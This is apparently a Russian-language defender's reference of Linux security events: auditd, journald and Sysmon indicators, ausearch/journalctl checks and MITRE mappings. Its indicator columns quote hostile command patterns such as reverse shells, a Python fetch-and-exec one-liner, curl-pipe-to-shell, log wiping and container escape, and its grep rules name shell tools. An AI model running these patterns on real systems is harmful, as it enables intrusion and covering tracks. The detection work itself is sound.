# Раздел: LINUX (события безопасности)

> auditd / journald / syslog / Sysmon for Linux: индикаторы атак, CLI-проверки (journalctl/ausearch), MITRE ATT&CK, SPL.

**Всего событий: 57** · категорий: 25

## Sysmon for Linux (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **ProcessCreate / NetworkConnect / ProcessTerminate / RawAccessRead / FileCreate / FileDelete** | Критическая | Sysmon for Linux порт Sysmon на Linux на базе eBPF. Логи в syslog/journald в формате близком к Windows Sysmon. Поддерживаемые ID: Event 1 — ProcessCreate (ProcessGuid/Hash/ParentImage); Event 3 — NetworkConnect; Event 5 — ProcessTerminate; Event 9 — RawAccessRead; Event 11 — FileCreate; Event 23 — FileDelete. ProcessTampering (Event 25) на Linux НЕ поддерживается. | • Event 1 с Image=/tmp/* или ParentImage=httpd<br>• Event 3 к IP из TI-фидов<br>• Event 11 с TargetFilename=/etc/cron*, /etc/systemd/*, *.ssh/authorized_keys<br>• Event 25 — всегда подозрительно (подмена памяти процесса) | ▸ Sysmon for Linux логи<br>$ journalctl -t sysmon --since "1 hour ago"<br>▸ Только ProcessCreate (Event 1)<br>$ journalctl -t sysmon \| grep -E 'EventID.: 1,'<br>▸ Сетевые соединения (Event 3)<br>$ journalctl -t sysmon \| grep -E 'EventID.: 3,' | T1055, T1059.004, T1071, T1547 |

## Process / Execution (3)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Запуск процесса (вызов execve/execveat)** | Критическая | Основное событие для телеметрии выполнения. SYSCALL даёт контекст (uid, auid, pid, ppid, exe, comm, success), EXECVE — аргументы argc/a0..aN. Требует правила -a always,exit -F arch=b64 -S execve,execveat. | • Обратные shell-ы: bash -i, nc -e, python -c 'pty'<br>• Скачивание и исполнение: wget\|curl ... \| sh<br>• LOLBins: awk, perl, vim, find -exec, env<br>• base64 -d \| bash, /tmp/* исполнение<br>• chmod +s, chattr +i<br>• Контейнерные escape: nsenter, unshare, mount | ▸ Все запуски процессов за час<br>$ ausearch -m EXECVE --start recent<br>▸ По конкретному пользователю (auid)<br>$ ausearch -m EXECVE -ua <uid><br>▸ Поиск bash -i / reverse shell<br>$ ausearch -m EXECVE \| grep -E 'bash -i\|/dev/tcp' | T1059.004, T1059.006, T1204, T1106 |
| **Подозрительный запуск Python (reverse shell, pty)** | Критическая | Python — топ-1 LOLBin на Linux для пост-эксплуатации: TTY upgrade, reverse shell, http.server, base64-loader. Регистрируется как EXECVE с exe=/usr/bin/python3 и аргументами -c / -m. | • python -c 'import pty; pty.spawn("/bin/bash")' (TTY upgrade)<br>• python -c 'import socket,subprocess,os; ...' (классический reverse shell)<br>• python -m http.server (подъём файл-сервера для эксфильтрации)<br>• python -m SimpleHTTPServer (Python 2)<br>• base64 -d \| python (обфускация пейлоада)<br>• exec(compile(...)) / __import__('os').system()<br>• python3 -c 'exec(__import__("urllib.request").urlopen("http://...")).read())' | ▸ Все запуски python за час<br>$ ausearch -m EXECVE --start recent \| grep -E 'python[23]?$'<br>▸ Активные python-процессы<br>$ ps -ef \| grep python \| grep -v grep<br>▸ Открытые сетевые сокеты python<br>$ ss -tunap \| grep python | T1059.006, T1027, T1071.001, T1105 |
| **Полный cmdline процесса (включая роботы)** | Высокая | PROCTITLE идёт вместе с SYSCALL/EXECVE и содержит hex-кодированный cmdline. Решает проблему EXECVE, который режет длинные аргументы. | • Hex-cmdline с base64-payload<br>• Длинные обфусцированные команды<br>• (none) процессы (process hollowing)<br>• Имитация системных имён (kthread, systemd-helper) | ▸ Просмотр PROCTITLE с декодом hex<br>$ ausearch -m PROCTITLE --start recent -i<br>▸ Полные cmdline активных процессов<br>$ ps -ef --no-headers<br>▸ Cmdline по PID<br>$ cat /proc/<pid>/cmdline \| tr '\0' ' ' | T1036.005, T1027, T1059 |

## Privilege Escalation (8)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Запуск команды через sudo (с фиксацией cmdline)** | Критическая | Регистрируется при вызове sudo: содержит ПОЛНУЮ командную строку, рабочий каталог, исходного и целевого пользователя. Главное событие для аудита привилегированных действий. | • sudo -i / sudo su - (получение root shell)<br>• Запуск sudo от не-админских пользователей<br>• Использование GTFOBins (vim, find, awk -> shell)<br>• sudo с NOPASSWD неожиданными пользователями<br>• Редактирование /etc/sudoers, /etc/shadow, /etc/passwd через sudo | ▸ Все sudo-команды за сегодня<br>$ ausearch -m USER_CMD --start today<br>▸ По конкретному пользователю<br>$ ausearch -m USER_CMD -ui <user><br>▸ Sudo через journal<br>$ journalctl _COMM=sudo --since today | T1548.003, T1078.003, T1059.004 |
| **Изменение capabilities и SUID-битов** | Критическая | SYSCALL capset (126), chmod/fchmod с mode, содержащим 04000/02000 (suid/sgid). Отслеживается правилом -a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F a1&04000 -k suid_change. | • chmod +s на /tmp/*, /dev/shm/*, ~/* бинарях<br>• Создание SUID-копии bash, dash, python, perl<br>• setcap cap_setuid+ep на подозрительных бинарях | ▸ Все SUID-бинари в системе<br>$ find / -perm -4000 -type f 2>/dev/null<br>▸ Изменения capabilities<br>$ ausearch -k suid_change --start today<br>▸ Capabilities у бинарей<br>$ getcap -r / 2>/dev/null | T1548.001, T1574 |
| **Изменение SELinux роли пользователя** | Высокая | newrole, semanage login, semanage user. Пишется в системах с SELinux. | • Переход в sysadm_r пользователем, который обычно в user_r<br>• Нежданный vendor mapping в semanage | ▸ SELinux роли в системе<br>$ semanage login -l<br>$ semanage user -l<br>▸ История изменений ролей<br>$ ausearch -m USER_ROLE_CHANGE --start week-ago<br>▸ Текущий контекст процесса<br>$ ps -eZ \| head | T1548.003 |
| **Смена пароля пользователя** | Высокая | passwd, chpasswd и аналоги. Пишется PAM-модулем pam_unix при изменении токена аутентификации. | • Смена пароля root вне окна обслуживания<br>• Смена пароля бывшему сотруднику<br>• Массовая смена (chpasswd в скрипте) | ▸ Все смены паролей за сегодня<br>$ ausearch -m USER_CHAUTHTOK --start today<br>▸ Через journal<br>$ journalctl --since today \| grep -i 'password changed'<br>▸ Когда последний раз менялся пароль<br>$ chage -l <user> | T1098, T1556 |
| **Эксплуатация SUID-бинарников (GTFOBins)** | Высокая | Использование SUID-бинарников (find, vim, awk, nmap и др.) для выполнения команд от root. Классика privesc по GTFOBins. | • SUID-бинарник запускает shell/команду (find ... -exec, vim -c)<br>• Новый SUID-файл вне стандартного набора<br>• EXECVE с uid!=0, но euid=0<br>• Нетипичные аргументы GTFOBins | ▸ Все SUID-бинарники<br>$ find / -perm -4000 -type f 2>/dev/null<br>▸ Сравнить с baseline GTFOBins<br>$ ausearch -m EXECVE \| grep -E "find\|vim\|awk\|nmap\|tar\|less" <br>▸ Новые SUID<br>$ find / -perm -4000 -mtime -7 2>/dev/null | T1548.001 |
| **Инъекция в процесс через ptrace (PTRACE_ATTACH)** | Высокая | Атакующий присоединяется к чужому процессу и внедряет код (shellcode/.so) — выполнение в контексте доверенного процесса. | • SYSCALL ptrace с PTRACE_ATTACH/POKETEXT<br>• Инъекция в системные процессы (sshd, systemd)<br>• ptrace от процесса, который не отладчик<br>• /proc/sys/kernel/yama/ptrace_scope = 0 | ▸ Вызовы ptrace<br>$ ausearch -m SYSCALL -sc ptrace --start today<br>▸ yama-политика<br>$ cat /proc/sys/kernel/yama/ptrace_scope<br>▸ Правило auditd<br># -a always,exit -F arch=b64 -S ptrace -k ptrace_inject | T1055.008, T1055.009 |
| **Манипуляции namespace (unshare/nsenter) и побег из контейнера** | Критическая | Атакующий использует unshare/nsenter или монтирование host-ФС для выхода из контейнера на хост. | • nsenter -t 1 -m -u -i -n (выход в PID 1 host)<br>• unshare с последующим chroot<br>• Монтирование host-путей внутрь контейнера<br>• Привилегированный контейнер + CAP_SYS_ADMIN | ▸ Использование nsenter/unshare<br>$ ausearch -m EXECVE \| grep -E "nsenter\|unshare"<br>▸ Привилегированные контейнеры<br>$ docker ps --quiet \| xargs docker inspect --format '{{.Name}} {{.HostConfig.Privileged}}' | T1611 |
| **Локальное повышение через известную уязвимость (PwnKit, DirtyPipe, Baron Samedit)** | Критическая | Эксплуатация публичных LPE: pkexec (PwnKit CVE-2021-4034), DirtyPipe (CVE-2022-0847), Sudo Baron Samedit (CVE-2021-3156), DirtyCow. Резкий рост привилегий из непривилегированного процесса. | • pkexec без аргументов или из необычного места<br>• sudoedit со спецсимволами (Baron Samedit)<br>• процесс с uid!=0 порождает uid=0 shell<br>• аномальные сообщения ядра (segfault/oops) | ▸ Подозрительный pkexec / эксплойты<br>$ ausearch -m EXECVE \| grep -E 'pkexec\|sudoedit'<br>▸ Сообщения ядра<br>$ dmesg -T \| grep -Ei 'segfault\|oops\|BUG' | T1068 |

## Управление учётками (2)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Создание / удаление пользователя в системе** | Критическая | useradd/adduser и userdel регистрируются PAM-модулями. Рядом всегда идёт USER_MGMT с деталями операции. | • Создание учётки с UID=0 вне root<br>• Создание бэкдор-учётки (toor, system, www-data2)<br>• Добавление пользователя в нерабочее время<br>• Удаление пользователей (сокрытие следов) | ▸ Все добавления/удаления пользователей<br>$ ausearch -m ADD_USER,DEL_USER --start today<br>▸ Кто менял /etc/passwd<br>$ ausearch -f /etc/passwd<br>▸ История изменений<br>$ grep -E 'useradd\|userdel' /var/log/auth.log | T1136.001, T1098, T1531 |
| **Создание/удаление группы, изменение членства** | Критическая | Проверяет добавление пользователей в высокопривилегированные группы: sudo, wheel, adm, docker, lxd, disk. | • Добавление в sudo/wheel — полный root<br>• Добавление в docker/lxd — эквивалент root<br>• Добавление в disk/shadow — чтение всех файлов<br>• Неожиданные GID=0 | ▸ Изменения групп<br>$ ausearch -m GRP_MGMT --start week-ago<br>▸ Кто в группе wheel/sudo сейчас<br>$ getent group wheel sudo docker<br>▸ История<br>$ grep -E 'groupadd\|gpasswd' /var/log/auth.log | T1098, T1136, T1611 |

## Persistence (7)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Изменения в cron и systemd-юнитах** | Критическая | Отслеживается через -w /etc/crontab -p wa -k cron, -w /etc/cron.d/, /etc/cron.daily/, /etc/cron.hourly/, /var/spool/cron/, /etc/systemd/system/, /etc/init.d/, /etc/rc*.d/. | • Новые cron задания с вызовами curl/wget/bash<br>• Модификация /var/spool/cron/crontabs/root<br>• Создание service-юнитов в /etc/systemd/system/ с ExecStart в /tmp<br>• Изменение ~/.bashrc, ~/.bash_profile, /etc/profile.d/<br>• LD_PRELOAD в /etc/environment | ▸ Изменения cron<br>$ ls -la /etc/cron.*/ /var/spool/cron/<br>$ ausearch -k cron_change --start today<br>▸ Активные cron-задачи<br>$ systemctl list-timers --all<br>▸ Юзерские crontab<br>$ for u in $(cut -d: -f1 /etc/passwd); do crontab -u $u -l 2>/dev/null; done | T1053.003, T1543.002, T1546.004, T1574.006 |
| **Backdoor в shell-профилях (.bashrc, .bash_profile, /etc/profile.d)** | Высокая | Атакующий дописывает команды (reverse shell, curl\|bash) в файлы инициализации shell — срабатывает при каждом входе/открытии терминала. Требует watch-правило auditd на эти пути. | • Добавление curl/wget/nc/bash -i в .bashrc<br>• Изменение профиля не владельцем файла<br>• base64/eval в файлах профиля<br>• Запись в /etc/profile.d/*.sh от не-root admin | ▸ Изменения файлов профиля<br>$ ausearch -k profile_change --start today<br>▸ Подозрительные строки<br>$ grep -RniE "curl\|wget\|nc \|bash -i\|/dev/tcp" ~/.bashrc /etc/profile.d/<br>▸ Недавно изменённые<br>$ find /home /etc/profile.d -name ".bashrc" -o -name "*.sh" -mtime -7 | T1546.004 |
| **Добавление SSH-ключа атакующего (~/.ssh/authorized_keys)** | Критическая | Атакующий дописывает свой публичный ключ в authorized_keys — получает постоянный беспарольный доступ по SSH. Один из самых частых способов закрепления. | • Новый ключ в authorized_keys вне процесса provisioning<br>• Ключ с неизвестным comment/email<br>• Создание ~/.ssh для сервисной УЗ (postgres, www-data)<br>• chmod 600 сразу после записи | ▸ Изменения authorized_keys<br>$ ausearch -k ssh_keys --start today<br>▸ Все ключи в системе<br>$ find / -name authorized_keys 2>/dev/null -exec ls -la {} \;<br>▸ Недавно изменённые<br>$ find /home /root -path "*/.ssh/authorized_keys" -mtime -7 | T1098.004 |
| **Создание systemd-timer или at-задания** | Высокая | Альтернатива cron для закрепления: .timer+.service юниты или одноразовые at-задания. Часто пропускается, т.к. мониторят только cron. | • Новый .timer в /etc/systemd/system или ~/.config/systemd/user<br>• at-задание с reverse shell<br>• Timer с OnBootSec/OnUnitActiveSec и подозрительным ExecStart<br>• systemctl enable неизвестного юнита | ▸ Все таймеры<br>$ systemctl list-timers --all<br>▸ at-очередь<br>$ atq; ls -la /var/spool/cron/atjobs/<br>▸ Недавно созданные юниты<br>$ find /etc/systemd /run/systemd ~/.config/systemd -name "*.timer" -o -name "*.service" -mtime -7 | T1053.003, T1053.006 |
| **PAM-backdoor: подмена модуля или pam_unix** | Критическая | Атакующий подменяет pam_unix.so или добавляет вредоносный PAM-модуль — перехват паролей и универсальный пароль (skeleton key). | • Изменение /lib*/security/pam_*.so<br>• Правка /etc/pam.d/* (добавление pam_exec с подозрительным скриптом)<br>• Несовпадение хеша/размера pam_unix.so с пакетом<br>• strings в pam_unix.so с хардкод-паролем | ▸ Изменения PAM<br>$ ausearch -k pam_change --start today<br>▸ Целостность модулей (Debian/RHEL)<br>$ dpkg -V libpam-modules; rpm -V pam<br>▸ Недавние правки<br>$ find /etc/pam.d /lib*/security -mtime -7 -ls | T1556.003 |
| **MOTD-backdoor (динамические скрипты motd)** | Высокая | Скрипты в /etc/update-motd.d выполняются от root при каждом SSH-входе — идеальное место для закрепления с эскалацией привилегий. | • Новый/изменённый файл в /etc/update-motd.d<br>• Команды сети/загрузки в motd-скриптах<br>• chmod +x на новый motd-файл | ▸ Изменения motd<br>$ ausearch -k motd_change --start today<br>▸ Содержимое<br>$ ls -la /etc/update-motd.d/<br>$ grep -RniE "curl\|wget\|bash -i\|/dev/tcp" /etc/update-motd.d/ | T1546 |
| **Персистентность через udev-правило или systemd-generator** | Высокая | Скрытная персистентность: udev-правило запускает payload при событии устройства, либо systemd-generator создаёт вредоносный юнит на раннем этапе загрузки. Реже проверяется защитниками. | • новые файлы в /etc/udev/rules.d/ с RUN+=<br>• файлы в /etc/systemd/system-generators/ или /lib/systemd/system-generators/<br>• RUN+= на подозрительный скрипт | ▸ Наблюдение<br>$ auditctl -w /etc/udev/rules.d/ -p wa -k persist<br>$ auditctl -w /etc/systemd/system-generators/ -p wa -k persist<br>▸ Проверка<br>$ grep -r 'RUN+=' /etc/udev/rules.d/ | T1547, T1543.002 |

## Kernel (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Загрузка/выгрузка модуля ядра** | Критическая | Сисвызовы init_module (175), finit_module (313), delete_module (176). Требуют правила вида -a always,exit -S init_module -S finit_module -k module_load. Альтернативно: KERN_MODULE в dmesg/journald. | • Загрузка неподписанных модулей<br>• Модули из /tmp, /home, /dev/shm<br>• Модули с именами руткитов (Diamorphine, Reptile)<br>• Выгрузка безопасностных модулей | ▸ Загруженные модули ядра<br>$ lsmod<br>▸ История загрузки модулей<br>$ ausearch -m KERN_MODULE --start week-ago<br>$ dmesg -T \| grep -i 'module'<br>▸ Подозрительные модули (без подписи)<br>$ cat /proc/modules \| awk '{print $1}' | T1547.006, T1014, T1601.001 |

## Defense Evasion (7)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Остановка auditd и изменение его правил** | Критическая | DAEMON_START (1801), DAEMON_END (1802), DAEMON_ABORT (1803), CONFIG_CHANGE (1305), DAEMON_RECONFIG (1804). Критически важны — атакующий первым делом пытается вырубить аудит. | • DAEMON_END вне окна обслуживания<br>• CONFIG_CHANGE с уменьшением правил<br>• auditctl -D (удаление всех правил)<br>• Остановка службы auditd через systemctl | ▸ Статус auditd<br>$ systemctl status auditd<br>$ auditctl -s<br>▸ Текущие правила<br>$ auditctl -l<br>▸ История падений<br>$ journalctl -u auditd --since yesterday | T1562.001, T1562.006, T1070 |
| **Очистка логов и истории (truncate /var/log, history -c, unset HISTFILE)** | Критическая | Анти-форензика: атакующий затирает /var/log/*, очищает bash-историю или отключает её запись, чтобы скрыть следы. | • truncate -s0 / rm /var/log/{auth,secure,syslog}<br>• history -c; rm ~/.bash_history<br>• unset HISTFILE или export HISTSIZE=0<br>• ln -sf /dev/null ~/.bash_history<br>• Резкое падение объёма логов | ▸ Удаление/изменение логов<br>$ ausearch -k log_tamper --start today<br>▸ EXECVE с truncate/shred/history<br>$ ausearch -m EXECVE \| grep -E "truncate\|shred\|history -c"<br>▸ Симлинки на /dev/null<br>$ find /home /root -name .bash_history -lname /dev/null | T1070.002, T1070.003 |
| **Userland-rootkit через LD_PRELOAD и /etc/ld.so.preload** | Критическая | Подмена библиотек через переменную LD_PRELOAD или файл /etc/ld.so.preload — перехват вызовов (скрытие процессов/файлов, кража creds). | • Непустой /etc/ld.so.preload<br>• EXECVE с LD_PRELOAD=/tmp/*.so<br>• .so в /tmp, /dev/shm, /var/tmp<br>• Неподписанные/неизвестные .so в прелоаде | ▸ Глобальный прелоад<br>$ cat /etc/ld.so.preload 2>/dev/null<br>$ ausearch -k preload --start today<br>▸ Процессы с LD_PRELOAD<br>$ for p in /proc/[0-9]*; do tr '\0' '\n' < $p/environ 2>/dev/null \| grep LD_PRELOAD && echo $p; done<br>▸ Подозрительные .so<br>$ ls -la /tmp /dev/shm /var/tmp \| grep '\.so' | T1574.006 |
| **Установка immutable-флага на вредоносные файлы** | Высокая | Атакующий ставит chattr +i на backdoor/ключи, чтобы их нельзя было удалить даже от root без снятия флага. | • EXECVE с chattr +i<br>• Файлы с флагом i в ~/.ssh, /etc, /tmp<br>• Невозможность удалить файл от root | ▸ immutable-файлы<br>$ lsattr -R /etc /root /home 2>/dev/null \| grep -- '----i'<br>▸ Использование chattr<br>$ ausearch -m EXECVE \| grep chattr | T1222.002 |
| **Сокрытие процессов/файлов (LKM- или userland-rootkit, /proc tampering)** | Критическая | Rootkit прячет PID, порты и файлы от штатных утилит. Выявляется расхождением между ps и /proc или ss и /proc/net. | • PID в /proc, но нет в ps<br>• Порт слушается, но не виден в ss/netstat<br>• init_module без известного пакета<br>• Скрытые файлы при сравнении ls и inode | ▸ Скрытые PID (ps vs /proc)<br>$ for p in /proc/[0-9]*; do pid=${p#/proc/}; ps -p $pid >/dev/null \|\| echo "HIDDEN: $pid"; done<br>▸ Скрытые порты<br>$ diff <(ss -ltnp) <(cat /proc/net/tcp)<br>▸ Модули ядра<br>$ lsmod; cat /proc/modules | T1014 |
| **Timestomp — подмена меток времени файлов (touch -r/-t)** | Средняя | Изменение временных меток файлов (mtime/atime) для маскировки под старые/легитимные — антифорензика. touch -t, touch -r <эталон>, вызовы utimensat. | • touch -t / -r по вредоносным файлам<br>• mtime файла раньше времени его создания<br>• utimensat вне типичных каталогов | ▸ Вызовы touch с таймстампом<br>$ ausearch -m EXECVE \| grep -E 'touch .*-[tr]'<br>▸ Аномалия времени (ctime vs mtime)<br>$ stat <файл> | T1070.006 |
| **Тамперинг записей входа (wtmp/btmp/utmp/lastlog)** | Высокая | Удаление/правка бинарных журналов входов (wtmp, btmp, utmp, lastlog) для сокрытия сессий атакующего. Инструменты: utmpdump, специализированные log-cleaners. | • запись/усечение /var/log/wtmp, btmp, lastlog<br>• запуск утилит очистки логинов<br>• 'last' не показывает известную сессию | ▸ Наблюдение<br>$ auditctl -w /var/log/wtmp -p wa -k logintamper<br>$ auditctl -w /var/log/btmp -p wa -k logintamper<br>▸ Проверка<br>$ ausearch -k logintamper<br>$ last -f /var/log/wtmp \| head | T1070.002 |

## Docker (2)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Доступ к Docker socket (эквивалент root)** | Критическая | Правило -w /var/run/docker.sock -p rwa -k docker_sock пишет каждый open() сокета. Любой, кто может писать в этот сокет — эффективный root на хосте. Дополнительно: API-вызовы к Docker daemon в journald (dockerd[...]: ..). | • Доступ к /var/run/docker.sock от не-root и не-члена docker group<br>• docker run --privileged, --pid=host, --net=host, -v /:/host<br>• docker run с mount /etc, /root, /proc в контейнер<br>• Доступ к сокету из контейнера (проброшен -v /var/run/docker.sock:/var/run/docker.sock) — классический escape<br>• curl --unix-socket /var/run/docker.sock http://localhost/containers/create | ▸ Кто открывал docker.sock<br>$ ausearch -f /var/run/docker.sock --start today<br>▸ Процессы, держащие сокет открытым<br>$ lsof /var/run/docker.sock<br>▸ Кто в группе docker (= root)<br>$ getent group docker | T1611, T1610, T1548 |
| **docker exec / runc / container escape** | Критическая | Запуск docker exec, docker run, runc, ctr, kubectl exec. Критичны: вызовы nsenter и unshare — прямые попытки escape. journald от dockerd пишет 'level=info ... exec ...'. | • docker exec -it <ct> /bin/bash в prod-контейнеры<br>• docker run --privileged + capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE)<br>• nsenter --target 1 --mount --uts --ipc --net --pid (escape)<br>• runc снаружи стандартных путей (CVE-2019-5736)<br>• docker pull из чужого registry, подозрительные имена образов<br>• PID=1 внутри контейнера — ParentImage=runc | ▸ Запущенные контейнеры<br>$ docker ps<br>▸ История exec-сессий<br>$ docker events --since 1h --filter 'event=exec_start'<br>▸ Логи containerd<br>$ journalctl -u containerd --since "1 hour ago"<br>▸ K8s exec-ивенты<br>$ kubectl get events -A --field-selector reason=Exec | T1611, T1610, T1059.004, T1525 |

## Аутентификация (4)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Вход пользователя в систему (login, gdm, su, sshd)** | Высокая | Пишется PAM-модулями при любом входе: локальный, SSH, su, sudo -i. Содержит поля res=success/failed, hostname, addr, terminal, acct. | • Множественные res=failed с одного addr (brute force)<br>• Вход root прямо (PermitRootLogin yes)<br>• Вход вне рабочих часов или из необычных геолокаций<br>• Успешный вход после серии неудач<br>• Входы под сервисными учётками (postgres, nginx) | ▸ Последние входы<br>$ last -n 50<br>$ lastlog \| head -30<br>▸ Входы за час<br>$ ausearch -m USER_LOGIN --start recent<br>▸ Через journal<br>$ journalctl _COMM=login --since "1 hour ago" | T1078, T1110, T1021.004 |
| **Аутентификация пользователя (этап ввода пароля/ключа)** | Высокая | Предшествует USER_LOGIN. Пишется PAM при каждой попытке аутентификации. Содержит op (PAM:authentication), использованный механизм (pubkey, password, gssapi). | • res=failed в связке с USER_LOGIN failed<br>• op=PAM:authentication с редким механизмом<br>• Несоответствие USER_AUTH success → USER_LOGIN failed | ▸ PAM-аутентификация (failed)<br>$ ausearch -m USER_AUTH -sv no --start today<br>▸ Через auth.log (Debian/Ubuntu)<br>$ grep 'pam_unix' /var/log/auth.log \| tail -50<br>▸ RHEL/CentOS<br>$ grep 'pam_unix' /var/log/secure \| tail -50 | T1110, T1078, T1556 |
| **Проверка валидности учётной записи (account)** | Средняя | PAM стадия account (проверка, разрешен ли вход этой учётке: время, хосты, блокировка). Даёт контекст об использовании nss_ldap, nss_sss и др. | • res=failed — учётка заблокирована / истёкла<br>• Проверка для сервисных учёток в нерабочее время | ▸ PAM account stage (failed)<br>$ ausearch -m USER_ACCT -sv no --start today<br>▸ Статус учётки<br>$ passwd -S <user><br>$ chage -l <user><br>▸ Заблокированные пользователи<br>$ awk -F: '($2 ~ /^!\|^\*/) {print $1}' /etc/shadow | T1078, T1110 |
| **Получение / обновление учётных данных (PAM credential)** | Средняя | PAM стадия credential. CRED_ACQ — первичное получение (Kerberos ticket, токен). CRED_REFR — обновление. | • Получение Kerberos-тикета для сервиса из необычного источника<br>• Множественные CRED_ACQ за короткое время (брут по Kerberos) | ▸ Получение credentials<br>$ ausearch -m CRED_ACQ --start today<br>▸ Kerberos-тикеты пользователя<br>$ klist -A<br>▸ Через journal<br>$ journalctl --since today \| grep -iE 'kerberos\|gss' | T1558, T1078 |

## SSH (3)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Успешный SSH-вход** | Высокая | Строки вида 'Accepted publickey for user from 1.2.3.4 port 12345 ssh2: RSA SHA256:...' в /var/log/auth.log (Debian/Ubuntu) или /var/log/secure (RHEL). Содержит fingerprint ключа, что критично для форензики. | • Вход под root с password (вместо publickey)<br>• Новый SHA256-fingerprint ключа для существующего пользователя<br>• Вход с IP вне подписок<br>• Вход в окно обслуживания без тикета | ▸ Успешные SSH-входы (journalctl)<br>$ journalctl _COMM=sshd --since "1 hour ago" \| grep Accepted<br>▸ С разбором — кто, откуда, метод<br>$ journalctl _COMM=sshd -S today \| grep -E 'Accepted (publickey\|password)'<br>▸ Текущие SSH-сессии<br>$ who ; ss -tnp '( sport = :ssh )' | T1021.004, T1078, T1098.004 |
| **Неудачный SSH-вход (brute force)** | Высокая | Failed password for [invalid user] X from 1.2.3.4 port 12345 ssh2' — основной индикатор брутфорса. Источник #1 данных для fail2ban. | • >10 fail с одного IP за 5 минут<br>• Перебор в словаре (admin, root, oracle, postgres, ubuntu, ec2-user)<br>• 'Invalid user' — атакующий перебирает логины<br>• Всплеск Failed → Accepted с того же IP = успешный брут | ▸ SSH brute force<br>$ journalctl _COMM=sshd --since "1 hour ago" \| grep -E 'Failed\|Invalid user'<br>▸ ТОП атакующих IP<br>$ journalctl _COMM=sshd -S today \| grep 'Failed' \| grep -oP 'from \K[\d.]+' \| sort \| uniq -c \| sort -rn \| head<br>▸ fail2ban статус<br>$ fail2ban-client status sshd | T1110.001, T1110.003, T1110.004 |
| **Использование SSH-ключа для хендшейка** | Средняя | Регистрируется при каждом криптографическом хендшейке sshd. Содержит SHA256-fingerprint host-ключа сервера и IP. | • Изменение fingerprint хост-ключа (MITM-признак)<br>• Массовые попытки хендшейка без USER_LOGIN (разведка сервера) | ▸ Использование SSH-ключей (handshakes)<br>$ ausearch -m CRYPTO_KEY_USER --start today<br>▸ Текущие host-ключи сервера<br>$ ls -la /etc/ssh/ssh_host_*<br>$ for k in /etc/ssh/ssh_host_*.pub; do ssh-keygen -lf $k; done<br>▸ Известные клиенту хосты<br>$ cat ~/.ssh/known_hosts \| wc -l | T1018, T1557, T1110 |

## File System (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Доступ к критичным файлам (-w правила)** | Высокая | Привязан к SYSCALL, идёт вместе с ним. Отслеживаются правилами -w /etc/passwd -p wa -k identity и т.д. Даёт inode, dev, mode, ouid, ogid, nametype (CREATE/NORMAL/DELETE). | • Изменения /etc/passwd, /etc/shadow, /etc/sudoers, /etc/ssh/sshd_config<br>• Создание ~/.ssh/authorized_keys для сервисных аккаунтов<br>• Изменения /etc/pam.d/*<br>• Изменения /etc/hosts.allow, /etc/hosts.deny<br>• Создание файла в /dev/shm и /tmp/.X* | ▸ Изменения критичных файлов<br>$ ausearch -f /etc/passwd -f /etc/shadow -f /etc/sudoers --start today<br>▸ По ключу (auditctl -k)<br>$ ausearch -k identity --start today<br>$ ausearch -k sshd --start today<br>▸ Recent изменения<br>$ find /etc -mtime -1 -type f | T1098.004, T1556.003, T1505.003 |

## Network (2)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
| **Сетевые соединения connect/accept** | Высокая | Сопровождает SYSCALL connect (42), accept (43), bind (49). Даёт saddr (hex-формат с family, port, IP). | • Исходящие к C2-инфраструктуре / IP из TI-фидов<br>• Исходящие connect от nginx, postgres, www-data (обычно только accept)<br>• bind() на высокие порты (>40000) от shell-процессов<br>• Подключения к приватным сетям из DMZ | ▸ Все сетевые соединения процессов<br>$ ausearch -m SOCKADDR --start recent -i<br>▸ Активные TCP-соединения с процессами<br>$ ss -tunap<br>▸ С декодом — какой процесс куда<br>$ lsof -i -n -P<br>▸ По конкретному порту<br>$ ss -tnp '( dport = :443 )' | T1071, T1571, T1041 |
| **Изменение правил iptables/nftables** | Высокая | Любые вызовы iptables, ip6tables, nft, ebtables. Регистрирует таблицу и семейство. | • iptables -F (flush всех правил)<br>• Новые ACCEPT правила для высоких портов<br>• Отключение firewalld/ufw<br>• Новые DNAT/MASQUERADE правила (tunneling) | ▸ Текущие правила iptables<br>$ iptables -L -n -v --line-numbers<br>$ iptables -t nat -L -n -v<br>$ nft list ruleset<br>▸ История изменений<br>$ ausearch -m NETFILTER_CFG --start today<br>▸ Журнал firewalld<br>$ journalctl -u firewalld --since today | T1562.004, T1090 |

## MAC / SELinux (1)

| Событие | Важность | Описание | Индикаторы атаки | Где проверить (CLI) | MITRE |
|:--|:--|:--|:--|:--|:--|
